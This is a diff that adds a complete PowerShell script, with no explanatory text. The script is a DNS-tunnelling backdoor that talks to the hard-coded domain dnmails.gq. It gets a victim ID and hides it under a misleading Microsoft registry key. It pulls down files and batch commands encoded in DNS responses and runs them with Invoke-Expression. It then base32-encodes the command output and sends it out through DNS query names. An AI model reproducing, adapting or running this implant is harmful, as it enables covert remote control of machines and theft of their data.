@@ -1,0 +1,334 @@
+﻿
+$scriptdir = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition
+$Global:domain = "dnmails.gq"
+$Global:ID = "A1"
+$Global:dFold = $scriptdir + "\dn"
+$Global:uFold = $scriptdir + "\up"
+$Global:tFold = $scriptdir + "\te"
+$Global:hostLen = 10
+$Global:regExist = 0
+$Global:batExist = 0
+
+ipconfig /flushdns
+
+Function IIf($If, $Right, $Wrong) {If ($If) {$Right} Else {$Wrong}}
+function DNSRequest
+{
+    param( [string]$hostname )
+    $Stoploop = $false
+    [int]$Retrycount = "0"
+    $ret = [System.Net.IPAddress[]]("0.0.0.0")
+    $success = $false
+    do{
+        try{
+            $ret = [System.Net.IPAddress[]][System.Net.Dns]::GetHostAddresses($hostname)
+            $Stoploop = $true
+            $success = $true
+        }
+        catch{
+            $success = $false
+            if ($Retrycount -gt 20){
+			    Write-Host "Could not send Information after 3 retrys."
+			    $Stoploop = $true
+                throw
+		    }
+		    else {			
+			    Start-Sleep -Seconds 2
+			    $Retrycount = $Retrycount + 1
+		    }
+        }
+    }
+    while($Stoploop -eq $false)
+    return $ret
+}
+function downip
+{
+ param( [int]$type )
+ $finished = 0
+ $filename = ""
+ $fileID = 0
+ $reqStr = "IF" 
+ 
+ $hostname = $reqStr[$type] + $Global:ID + (-join ((65..90) + (48..57) + (97..122) | Get-Random -Count 2 | % {[char]$_})) + "." + $Global:domain 
+ $ipAddy = ([System.Net.IPAddress[]](DNSRequest $hostname))[0].GetAddressBytes()
+ 
+ #$ipAddy = [System.Net.Dns]::GetHostAddresses($hostname)[0].GetAddressBytes()
+ 
+ if (($ipAddy[0] -eq $ipAddy[1]) -and ($ipAddy[0] -eq 63))
+ {
+    
+    $fileID = [char]$ipAddy[2] + [char]$ipAddy[3]
+    Write-Host "fileID:"  $fileID
+
+    # ============= Get File Name From ID ================
+    $finishedFileName = [int]0
+    $namePart = [int]0
+    while($finishedFileName -eq 0){
+        $hostname = "P" + $fileID + [string]$namePart +  (-join ((65..90) + (48..57) + (97..122)| Get-Random -Count 2 | % {[char]$_})) + "."  + $Global:domain        
+        $ipFileNameAddr = ([System.Net.IPAddress[]](DNSRequest $hostname))[0].GetAddressBytes()
+        #$ipFileNameAddr = [System.Net.Dns]::GetHostAddresses($hostname)[0].GetAddressBytes()                
+        if ($ipFileNameAddr[0] -eq 68)
+        {   
+            if (($ipFileNameAddr[1] -eq 127) -or ($ipFileNameAddr[2] -eq 127) -or ($ipFileNameAddr[3] -eq 127)){
+                $finishedFileName = [int]1 
+            }                            
+            $filename = $filename + (IIf ($ipFileNameAddr[1] -ne 127) ([char]$ipFileNameAddr[1]) "") + (IIf ($ipFileNameAddr[2] -ne 127) ([char]$ipFileNameAddr[2]) "") + (IIf ($ipFileNameAddr[3] -ne 127) ([char]$ipFileNameAddr[3]) "")
+            $namepart = [int]$namePart + [int]1
+        }
+        
+    }
+    Write-Host "download filename: " $filename
+
+    # ============ Get File Data From ID ==================
+    $finishedData = [int]0
+    $fsize = [int]0
+    $tempFilePath =  ($Global:tFold) + "\" + $filename
+    
+    while($finishedData -eq 0){
+        #Write-Host "current file size:" ([string] (Get-Item $tempFilePath).length)
+        $fileHdl = [io.file]::Open($tempFilePath,"Append");
+        $hostname = "D" + $fileID + (-join ((65..90) + (48..57) + (97..122)| Get-Random -Count 2 | % {[char]$_})) + (([string](mybase32UInt32 (Get-Item $tempFilePath).length)).Remove(0,2).Remove(5,1))  + "." + $Global:domain 
+        ([System.Net.IPAddress[]](DNSRequest $hostname)).GetEnumerator()| Sort-Object address | foreach{
+            #[System.Net.Dns]::GetHostAddresses($hostname).GetEnumerator() | Sort-Object address | foreach {            
+            Write-Host "response ip: " $_.GetAddressBytes()
+            if ([int]$_.GetAddressBytes()[0] -gt 130)#orginal : -gt 240 but error occured change it to 130
+            {
+                $sequenceIndex = [int]$_.GetAddressBytes()[0] - 240                 
+                if ([int]$_.GetAddressBytes()[1] -ne 127){
+                    $fileHdl.WriteByte($_.GetAddressBytes()[1])                    
+                }
+                if ([int]$_.GetAddressBytes()[2] -ne 127){
+                    $fileHdl.WriteByte($_.GetAddressBytes()[2])
+                }
+                if ([int]$_.GetAddressBytes()[3] -ne 127){
+                    $fileHdl.WriteByte($_.GetAddressBytes()[3])
+                }
+                if ([int]$_.GetAddressBytes()[3] -eq 127){ #if last byte equal 127 file data is finished
+                    $finishedData = 1
+                }                                
+            }
+        }
+        $fileHdl.Close()
+    }    
+    $b64Data = [System.IO.File]::ReadAllBytes($tempFilePath)
+    $data = [System.Convert]::FromBase64CharArray($b64Data,0,$b64Data.Length) 
+    $filePath =  ($Global:dFold) + "\" + $filename
+    [io.file]::WriteAllBytes($filePath,$data)
+    del $tempFilePath
+    return $filename
+ }
+ Write-Host "not exist File" 
+ return $filename
+}
+function upip
+{
+    param( [string]$fname )
+    Write-Host "upload file:" ([string]$fname)
+    $filePath = ($Global:tFold) + "\" + $fname
+    $success = 0
+    #=========== Get Upload ID ====================
+    $hostname = "Y" + $Global:ID + (-join ((65..90) + (48..57) + (97..122)| Get-Random -Count 2 | % {[char]$_}))+ $fname.Replace(".","")  + "." + $Global:domain 
+    Write-Host "host name = " $hostname
+    $respBytes = ([System.Net.IPAddress[]](DNSRequest $hostname))[0].GetAddressBytes()
+    #$respBytes = [System.Net.Dns]::GetHostAddresses($hostname)[0].GetAddressBytes()
+    if (($respBytes[0] -eq $respBytes[1]) -and ($respBytes[0] -eq [byte]74))
+    {
+        $uploadID = [char]$respBytes[2] + [char]$respBytes[3]
+        Write-Host "upload ID:" $uploadID
+        # ================  Upload File Data =====
+        $uploadedCompleteSize = [uint32]0
+        $fileData = (get-content $filePath -encoding byte)
+        $base32filedata = (base32data $fileData)
+        while($uploadedCompleteSize -lt $base32filedata.length)
+        {
+            Write-Host "complete size:" $uploadedCompleteSize " base32:" ([string](mybase32UInt32 $uploadedCompleteSize)) "from"  $base32filedata.length
+            Write-Host "data:" (-join $base32filedata[$uploadedCompleteSize..$($uploadedCompleteSize + $Global:hostLen-8)])
+            $hostname = "Q" + $uploadID + ([string](mybase32UInt32 $uploadedCompleteSize)).Remove(0,2).Remove(5,1) + (-join $base32filedata[$uploadedCompleteSize..$($uploadedCompleteSize + $Global:hostLen-8)]) + "." + $Global:domain             
+            Write-Host "upload data host name:" $hostname
+            $respBytes = ([System.Net.IPAddress[]](DNSRequest $hostname))[0].GetAddressBytes()
+            #$respBytes = [System.Net.Dns]::GetHostAddresses($hostname)[0].GetAddressBytes()
+            if ([int]$respBytes[0] -eq 75)
+            {
+                $uploadedCompleteSize = [uint32]($respBytes[3]+$respBytes[2]*100+$respBytes[1]*10000)                                
+            }     
+               
+        }
+        #============== upload successfully send and delete file ===========
+        $hostname = "Z" + $uploadID + (-join ((65..90) + (48..57) + (97..122)| Get-Random -Count 2 | % {[char]$_}))  + "." + $Global:domain 
+        $respBytes = ([System.Net.IPAddress[]](DNSRequest $hostname))[0].GetAddressBytes()
+        #$respBytes = [System.Net.Dns]::GetHostAddresses($hostname)[0].GetAddressBytes()
+        if (([int]$respBytes[0] -eq 76) -and ([int]$respBytes[1] -eq 76) -and ([int]$respBytes[2] -eq 76) -and ([int]$respBytes[3] -eq 76))
+        {
+            del $filePath
+            return "OK"
+        }
+    }
+}
+#because byte array to uint is reverse implement my converter
+# [bitconverter]::ToUInt64(([byte[]](0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00)) = 1 but is not correct response
+# myToUint64 [byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01) = 1 is correct
+function myToUint64
+{
+    param( [byte[]]$data )      
+    $retUint = [uint64]0
+    $powCount = [int]0
+    for($len=($data.Length-1); $len -ge 0; $len--)
+    {
+        $retUint = $retUint + $data[$len] * [Math]::Pow(16,$powCount)
+        $powCount = $powCount + 2;        
+    }    
+    return $retUint
+}
+function base32data
+{
+    param( [byte[]]$data )    
+    $ret = ""
+    if ($data.Length -eq 0) { return ret}
+    $charmap = "abcdefghijklmnopqrstuvwxyz012345"
+        
+    #split data array to 5byte - 5byte uint64  
+    for ($fiveByteIndex = 0;$fiveByteIndex -lt  [Math]::Ceiling($data.Length/5); $fiveByteIndex++) #
+    {
+        #select 5byte, if $fivebyteIndex > ($data.Length/5) select until last element,else select 5 element ==> $array[2..6]
+        $bytes = [byte[]]$data[($fiveByteIndex * 5)..(IIF ($fiveByteIndex -lt ($data.Length/5)) (($fiveByteIndex*5)+4)  ($data.Length-1))]
+
+        
+        # if ($bytes.length%(size(Int64))!=0)  then powershell throw exception so must be extend to 8 byte              
+        $number =  myToUint64 $bytes
+        #"number " + [string]$number
+
+        $paddingBitRequire = (5 - (($bytes.Length * 8) % 5)) % 5 #in last loop paddingBitRequire affected
+        $outputB32Len = ($bytes.Length*8 + $paddingBitRequire)/5
+
+        
+        for ($powIndex = ($bytes.Length*8 - 1) ; $powIndex -ge 4; $powIndex = $powIndex - 5)
+        {         
+            $ret = $ret + $charmap[[Math]::Pow(2,(-1 * $powIndex + 4))*($number -band [uint64]([Math]::Pow(2,$powIndex) + [Math]::Pow(2,$powIndex-1) + [Math]::Pow(2,$powIndex-2) + [Math]::Pow(2,$powIndex-3) + [Math]::Pow(2,$powIndex-4)))]                   
+            #[string](($number -band [uint64]([Math]::Pow(2,$powIndex) + [Math]::Pow(2,$powIndex-1) + [Math]::Pow(2,$powIndex-2) + [Math]::Pow(2,$powIndex-3) + [Math]::Pow(2,$powIndex-4))) -shr ($powIndex - 4))  + "==>" + $ret
+        }
+        #example: 10001001 01000101  10001000 ==> $powIndex=3 ==> 1000 reminded
+        if ($powIndex -ge 0) # need add padding to reminded, only if $powIndex==-1 then no require padding
+        {            
+            switch ($powIndex)
+            {
+                0 {$ret = $ret + $charmap[$number -band [uint64](1)] + "6"}
+                1 {$ret = $ret + $charmap[$number -band [uint64](3)] + "7"}
+                2 {$ret = $ret + $charmap[$number -band [uint64](7)] + "8"}
+                3 {$ret = $ret + $charmap[$number -band [uint64](15)]+ "9"}
+            } 
+        }              
+    }
+    return $ret        
+}
+
+
+function mybase32UInt32
+{
+    param([uint32]$inputnumber)
+    $ret = ""
+    $bytes = ([bitconverter]::GetBytes($inputnumber))
+    [array]::Reverse($bytes)
+    return (base32data $bytes)
+}
+Try
+{
+    if(-not(Test-Path -Path ($global:uFold))){
+        mkdir $global:uFold
+    }
+    if(-not (Test-Path -Path ($global:dFold))){
+        mkdir $global:dFold
+    }
+    if(-not (Test-Path -Path ($global:tFold))){
+        mkdir $global:tFold
+    }
+    # ==== get ID from registry if exists ============
+    if ((Get-ItemProperty -Path HKCU:\Software\Microsoft\FTP -Name ID  -ErrorAction SilentlyContinue) -ne $null)
+    {
+        $Global:ID = ([string]((Get-ItemProperty -Path HKCU:\Software\Microsoft\FTP -Name ID).ID)).Substring(0,2)
+        Write-Host "GlobalID from Reg :"  $Global:ID
+    }
+    #======= if not have ID get ID from server
+    if ($Global:ID -eq "A1")
+    {
+        $hostname = "N" + (-join ((65..90) + (48..57) + (97..122)| Get-Random -Count 5 | % {[char]$_}))  + "." + $Global:domain         
+        $respBytes = ([System.Net.IPAddress[]](DNSRequest $hostname))[0].GetAddressBytes()
+        #$respBytes = [System.Net.Dns]::GetHostAddresses($hostname)[0].GetAddressBytes()
+        if (([int]$respBytes[0] -eq 61) -and ([int]$respBytes[1] -eq 61))
+        {
+            $Global:ID = [char]$respBytes[2] + [char]$respBytes[3]
+            New-ItemProperty -Path "HKCU:\Software\Microsoft\FTP" -Name "ID" -Value $Global:ID -PropertyType String -Force
+            Write-Host "GlobalID from server: "  $Global:ID
+        }
+    }
+    # ====== get control value and batch & normal file existence
+    $hostname = "C" + $Global:ID + (-join ((65..90) + (48..57) + (97..122)| Get-Random -Count 2 | % {[char]$_}))  + "." + $Global:domain 
+    $respBytes = ([System.Net.IPAddress[]](DNSRequest $hostname))[0].GetAddressBytes()
+    #$respBytes = [System.Net.Dns]::GetHostAddresses($hostname)[0].GetAddressBytes()
+            #todo: in server must locked existence regular and batch files after send this command response
+    if (([int]$respBytes[0] -eq 62))
+    {
+        $Global:regExist = $respBytes[1]
+        $Global:batExist = $respBytes[2]
+        $Global:hostLen  = $respBytes[3]
+        Write-Host "regExist:"  $Global:regExist  " batExist:"  $Global:batExist  " hostlen="  $Global:hostLen
+    }
+    # ===== check if hostlen is Ok ?
+    $hostname = "T" + $Global:ID + (-join ((65..90) + (48..57) + (97..122)| Get-Random -Count ($Global:hostLen-3) | % {[char]$_}))  + "." + $Global:domain 
+    $respBytes = ([System.Net.IPAddress[]](DNSRequest $hostname))[0].GetAddressBytes()
+    #$respBytes = [System.Net.Dns]::GetHostAddresses($hostname)[0].GetAddressBytes()
+    if (([int]$respBytes[0] -ne 65) -or ([int]$respBytes[1] -ne 65) -or ([int]$respBytes[2] -ne 65) -or ([int]$respBytes[3] -ne $Global:hostLen))
+    {
+        $Global:hostLen = 10 
+        Write-Host "host len is 10"    
+    }
+    while ($Global:regExist -gt 0)
+    {
+        $ret = downip 1
+        Write-Host $ret
+        $Global:regExist = $Global:regExist - 1
+    }
+    while ($Global:batExist -gt 0)
+    {
+        $filename = ""
+        $filename = downip 0 #return name of batch
+        Write-Host "running batch file:" $filename
+        if ($filename -ne "")
+        {
+            $batchFilePath = $Global:dFold + "\" + $filename
+            
+            Rename-Item $batchFilePath	($batchFilePath+".bat")
+		    $batchFilePath = $batchFilePath+".bat"
+			
+			$batchFileData = "@echo off`n" + (get-content $batchFilePath)
+			
+			Set-content -Path $batchFilePath -Value $batchFileData
+            $resultFilePath = $global:uFold + '\' + $filename
+            
+            Invoke-Expression (($batchFilePath -replace ' ', '` ') + ' > ' + ($resultFilePath -replace ' ', '` '));
+            del (($batchFilePath -replace '`', ''))
+            $Global:batExist = $Global:batExist -1 
+                
+        }
+    }
+    Get-ChildItem $global:uFold -force |   % {
+        $_.FullName 
+        $_.Name 
+        move $_.FullName ($Global:tFold + "\" + $_.Name)
+        upip ($_.Name)
+    }
+}
+catch
+{
+    write-host $_.InvocationInfo.ScriptLineNumber
+    write-host $_.InvocationInfo.OffsetInLine
+    Write-Host $_.Exception.Message
+    Write-Host $_.Exception.ItemName
+    #send error to server
+    $hostname = "E" + $Global:ID + (-join ((65..90) + (48..57) + (97..122)| Get-Random -Count 2 | % {[char]$_})) +([string]$_.InvocationInfo.ScriptLineNumber) + "." + $Global:domain 
+    Write-Host $hostname
+    sleep 100
+    [System.Net.Dns]::GetHostAddresses($hostname)    
+
+}
+
+
